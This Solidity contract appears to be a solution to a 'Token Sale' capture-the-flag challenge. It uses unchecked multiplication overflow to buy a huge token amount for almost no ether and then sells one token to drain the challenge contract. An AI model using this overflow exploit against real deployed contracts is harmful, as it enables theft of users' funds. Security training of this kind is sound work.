// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "hardhat/console.sol";


import {TokenSaleChallenge} from "./TokenSaleChallenge.sol";

contract TokenSaleExploit {
    TokenSaleChallenge public tokenSale;

    constructor(TokenSaleChallenge _tokenSale) payable{
        tokenSale = _tokenSale;
    }

    receive() external payable {}

    function valueToAttack() pure public returns (uint256, uint256){
        uint256 maxInt = type(uint256).max; 

        // maxInt = numTokens * 1 ether (numTokens required to reach max )
        uint256 numTokens = 0; 
        unchecked {numTokens = (maxInt / 1 ether ) + 1;}  // amount tokens required to overflow
        uint256 value = 0;
        unchecked { value = numTokens * 1 ether; }
        return (numTokens, value) ; 

    }

    function attack() public {
        uint256 numTokens = 0 ;
        uint256 msgValue = 0 ; 
        (numTokens, msgValue) = valueToAttack(); 
        console.log("numTokens: ", numTokens); 
        console.log("Value: ", msgValue); 

    

        require(msgValue > 0, "error");
        tokenSale.buy{value: msgValue}(numTokens);
        tokenSale.sell(1); 

    }


}